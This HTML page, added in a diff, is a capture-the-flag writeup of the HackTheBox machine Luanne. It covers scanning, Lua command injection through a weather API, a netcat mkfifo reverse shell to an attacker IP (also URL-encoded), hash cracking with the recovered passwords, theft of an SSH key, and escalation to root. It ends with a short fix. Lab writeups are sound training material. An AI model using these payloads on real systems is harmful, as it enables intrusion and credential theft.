@@ -1,0 +1,181 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HackTheBox - Luanne Writeup · ElleuchX1</title><meta name="description" content="Here's my writeup for the RETIRED machine Luanne, Which is an Easy NetBSD machine!"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ElleuchX1" href="/rss.xml"><meta property="og:title" content="HackTheBox - Luanne Writeup · ElleuchX1"><meta property="og:description" content="Here's my writeup for the RETIRED machine Luanne, Which is an Easy NetBSD machine!"><meta property="og:type" content="article"><meta property="og:url" content="https://elleu.ch/posts/htb-luanne/"><meta property="og:image" content="https://elleu.ch/og/htb-luanne.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://elleu.ch/og/htb-luanne.png"><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', t);
+        } catch (e) {}
+      })();
+      document.addEventListener('keydown', function (e) {
+        if (e.key !== '/' || e.metaKey || e.ctrlKey || e.altKey) return;
+        var t = e.target;
+        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+        e.preventDefault();
+        window.location.href = '/search/';
+      });
+    </script><link rel="stylesheet" href="/_astro/_id_.mL4ELXTH.css"></head> <body> <a class="skip" href="#main">skip to content</a> <header class="site-header" data-pagefind-ignore> <div class="inner"> <a class="brand" href="/">elleuch<span class="at">:~$</span></a> <nav class="nav" aria-label="Main"> <a href="/posts/" aria-current="page">Posts</a><a href="/tags/">Tags</a><a href="/about/">About</a> <a class="search" href="/search/"><kbd>/</kbd></a> <button class="toggle" id="theme-toggle" type="button" aria-label="Toggle theme"> <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path> </svg> <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path> </svg> </button> <script>
+  document.getElementById('theme-toggle')?.addEventListener('click', () => {
+    const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+</script> </nav> </div> </header> <main id="main">  <div class="progress" id="progress"></div> <div class="wrap"> <article class="article" data-pagefind-body> <a class="back" href="/posts/">← Posts</a> <header class="article-head"> <h1 data-pagefind-meta="title">HackTheBox - Luanne Writeup</h1> <div class="article-meta"> <time datetime="2021-03-06T00:00:00.000Z">2021-03-06</time> <span>3 min read</span> </div> <div class="article-tags"> <a href="/tags/hackthebox/">#HackTheBox</a><a href="/tags/easy/">#Easy</a><a href="/tags/netbsd/">#NetBSD</a> </div> </header> <details class="toc" open data-pagefind-ignore> <summary>contents</summary> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#dirb-scan">Dirb scan</a></li> </ul> </details> <div class="prose">  <h1 id="information-gathering">Information Gathering</h1>
+<hr>
+<h2 id="nmap-scan">Nmap scan</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> nmap</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> 10.10.10.218</span><span style="color:#79B8FF"> -v</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="nmap" src="/assets/img/htb-luanne/nmap.webp">
+<p>As we can see above, We have 3 PORTS open:</p>
+<ul>
+<li>Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it</li>
+<li>Port 80 running nginx ; robots.txt —> /weather</li>
+<li>Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something to look at</li>
+</ul>
+<blockquote>
+<p>Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing</p>
+</blockquote>
+<h2 id="dirb-scan">Dirb scan</h2>
+<blockquote>
+<p>You can clone the SecLists repo from here <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p>
+</blockquote>
+<p>We already got  <strong>/weather/</strong> from the nmap results, let’s see enum more</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">dirb</span><span style="color:#79B8FF"> -R</span><span style="color:#9ECBFF"> http://10.10.10.218/weather/</span><span style="color:#9ECBFF"> /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt</span><span style="color:#E1E4E8"> </span></span></code></pre>
+<img decoding="async" loading="lazy" alt="dirb" src="/assets/img/htb-luanne/dirb.webp">
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>From our previous scans we were able to find</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://10.10.10.218/weather/forecast/</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="forecast" src="/assets/img/htb-luanne/forecast.webp">
+Let's try it as a GET param
+<img decoding="async" loading="lazy" alt="get" src="/assets/img/htb-luanne/get.webp">
+Adding a &#x3C; ' > causes an error
+<img decoding="async" loading="lazy" alt="luaerror" src="/assets/img/htb-luanne/luaerror.webp">
+<blockquote>
+<p>Skipping the SQL Injection part as it got me nothing</p>
+</blockquote>
+<p>Let’s now try if we have any potential code injection.
+Basically, The idea is to end the current lua command and inject.
+Another think to note for lua a comment starts anywhere with a double hyphen ( — ) and runs until the end of the line.</p>
+<p>Let’s first try this payload</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/weather/forecast?city=London');print("\nhi")--</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="print" src="/assets/img/htb-luanne/print.webp">
+That worked! Let's try if we can use system commands
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/weather/forecast?city=London');print("\n");os.execute("id")--</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="id" src="/assets/img/htb-luanne/id.webp">
+<p>That worked aswell! Let’s now get a reverse shell</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">rm</span><span style="color:#9ECBFF"> /tmp/f</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">mkfifo</span><span style="color:#9ECBFF"> /tmp/f</span><span style="color:#E1E4E8">;</span><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /tmp/f</span><span style="color:#F97583">|</span><span style="color:#B392F0">/bin/sh</span><span style="color:#79B8FF"> -i</span><span style="color:#F97583"> 2>&#x26;1|</span><span style="color:#B392F0">nc</span><span style="color:#9ECBFF"> ip</span><span style="color:#9ECBFF"> port</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF">/tmp/f</span></span></code></pre>
+<p>Final url encoded payload:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d</span></span></code></pre>
+<p>Let’s execute it and get a shell on the box
+<img decoding="async" loading="lazy" alt="foothold" src="/assets/img/htb-luanne/foothold.webp"></p>
+<hr>
+<h1 id="user-privesc">User PrivEsc</h1>
+<p>We can see that we have the default  <strong>.htpasswd</strong> file which can contain potential passwords
+<img decoding="async" loading="lazy" alt="pass" src="/assets/img/htb-luanne/pass.webp">
+Let’s see what we got there
+<img decoding="async" loading="lazy" alt="webapi" src="/assets/img/htb-luanne/webapi.webp"></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">$1</span><span style="color:#E1E4E8">$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> hash</span><span style="color:#E1E4E8"> ; </span><span style="color:#B392F0">john</span><span style="color:#9ECBFF"> hash</span><span style="color:#79B8FF"> -w=/opt/rockyou.txt</span></span></code></pre>
+<p>And we cracked it!
+<img decoding="async" loading="lazy" alt="best" src="/assets/img/htb-luanne/best.webp"></p>
+<p>Let’s start by viewing the running processes</p>
+<blockquote>
+<p>You need to specify the w tag to view the whole command</p>
+</blockquote>
+<img decoding="async" loading="lazy" alt="mich" src="/assets/img/htb-luanne/mich.webp">
+We can see that the user **r.michaels** is running a local server at port 3001! Let's exploit this to get his private SSH key!
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#9ECBFF"> http://127.0.0.1:3001/~r.michaels/id_rsa</span></span></code></pre>
+<p>But we get 401 Unauthorized page!</p>
+<img decoding="async" loading="lazy" alt="unauth" src="/assets/img/htb-luanne/unauth.webp">
+Let's try the credentials that we got earlier
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#9ECBFF"> http://127.0.0.1:3001/~r.michaels/id_rsa</span><span style="color:#79B8FF"> --user</span><span style="color:#9ECBFF"> webapi_user:iamthebest</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="ssh" src="/assets/img/htb-luanne/ssh.webp">
+And it worked! Let's login to the user
+<img decoding="async" loading="lazy" alt="user" src="/assets/img/htb-luanne/user.webp">
+<p>And we grab that user flag!</p>
+<h1 id="root-privesc">Root PrivEsc</h1>
+<p>An interesting backups file which contains an encrypted tar.gz file</p>
+<img decoding="async" loading="lazy" alt="back" src="/assets/img/htb-luanne/back.webp">
+<p>Because we’re on an NetBSD box, we’re gonna use netpgp to decrypt then extract its content</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">netpgp</span><span style="color:#79B8FF"> --decrypt</span><span style="color:#9ECBFF"> devel_backup-2020-09-16.tar.gz.enc</span><span style="color:#79B8FF"> --output=backup.tar.gz</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="tar" src="/assets/img/htb-luanne/tar.webp">
+<p>Let’s check that .htpasswd file!
+<img decoding="async" loading="lazy" alt="root" src="/assets/img/htb-luanne/root.webp">
+<code>webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.</code></p>
+<p>Let’s crack this password with john!</p>
+<img decoding="async" loading="lazy" alt="pass root" src="/assets/img/htb-luanne/pass_root.webp">
+<p><code>littlebear</code></p>
+<p>Let’s try to switch to the root user with this password!</p>
+<blockquote>
+<p><a href="https://www.vultr.com/docs/introduction-to-doas-on-NetBSD">https://www.vultr.com/docs/introduction-to-doas-on-NetBSD</a></p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">doas</span><span style="color:#9ECBFF"> su</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="roott" src="/assets/img/htb-luanne/roott.webp">
+<p>And we rooted the box!</p>
+<hr>
+<h1 id="bonus-section">Bonus Section</h1>
+<p>Let’s see what caused the lua injection!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/r.michaels/devel/webapi/weather.lua</span></span></code></pre>
+<p>Going through the code we can see the injection point!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="lua"><code><span class="line"><span style="color:#E1E4E8">httpd.</span><span style="color:#79B8FF">write</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'"error": "unknown city: ' </span><span style="color:#F97583">..</span><span style="color:#E1E4E8"> city </span><span style="color:#F97583">..</span><span style="color:#9ECBFF"> '"}'</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<p>basically what we have done is</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="lua"><code><span class="line"><span style="color:#E1E4E8">httpd.</span><span style="color:#79B8FF">write</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'"error": "unknown city: hi'</span><span style="color:#E1E4E8">);</span><span style="color:#79B8FF">os.execute</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"id"</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D">-- '"}')</span></span></code></pre>
+<p>To avoid this kind of injection, we should validate and sanitize the “city” input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,…}
+Or just by removing the ’.. city ..’ part!</p>  </div> <nav class="pager" aria-label="Post navigation"> <span></span> <a class="next" href="/posts/htb-passage/"><span class="lbl">next →</span>HackTheBox - Passage Writeup</a> </nav> </article> </div> <aside class="toc-rail" data-pagefind-ignore aria-label="Table of contents"> <div class="lbl">contents</div> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#dirb-scan">Dirb scan</a></li> </ul> </aside><button class="to-top" id="to-top" type="button" aria-label="Back to top">↑ top</button>  </main> <footer class="site-footer" data-pagefind-ignore> <div class="inner"> <span>© 2026 ElleuchX1</span> <span> <a href="https://github.com/ElleuchX1">github</a> ·
+<a href="https://twitter.com/ElleuchX1">x</a> ·
+<a href="/rss.xml">rss</a> ·
+<a href="mailto:contact@elleu.ch">mail</a> </span> </div> </footer> </body></html> <script>
+  (function () {
+    // reading progress + back-to-top
+    var bar = document.getElementById('progress');
+    var top = document.getElementById('to-top');
+    function update() {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      var pct = max > 0 ? h.scrollTop / max : 0;
+      if (bar) bar.style.width = pct * 100 + '%';
+      if (top) top.classList.toggle('show', h.scrollTop > 600);
+    }
+    document.addEventListener('scroll', update, { passive: true });
+    if (top) top.addEventListener('click', function () { window.scrollTo({ top: 0, behavior: 'smooth' }); });
+    update();
+
+    // permalink anchors on headings
+    document.querySelectorAll('.prose h2[id], .prose h3[id]').forEach(function (h) {
+      var a = document.createElement('a');
+      a.className = 'anchor';
+      a.href = '#' + h.id;
+      a.setAttribute('aria-label', 'Link to this section');
+      a.textContent = '#';
+      h.appendChild(a);
+    });
+
+    // code blocks: language label + copy button
+    document.querySelectorAll('.prose pre.astro-code').forEach(function (pre) {
+      var wrap = document.createElement('div');
+      wrap.className = 'code';
+      pre.parentNode.insertBefore(wrap, pre);
+      var bar = document.createElement('div');
+      bar.className = 'code-bar';
+      var lang = pre.getAttribute('data-language') || 'text';
+      var span = document.createElement('span');
+      span.className = 'code-lang';
+      span.textContent = lang;
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy';
+      btn.textContent = 'copy';
+      btn.addEventListener('click', function () {
+        var text = pre.innerText;
+        var done = function () { btn.textContent = 'copied'; setTimeout(function () { btn.textContent = 'copy'; }, 1200); };
+        if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, done); }
+        else {
+          var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {} ta.remove(); done();
+        }
+      });
+      bar.appendChild(span);
+      bar.appendChild(btn);
+      wrap.appendChild(bar);
+      wrap.appendChild(pre);
+    });
+  })();
+</script>
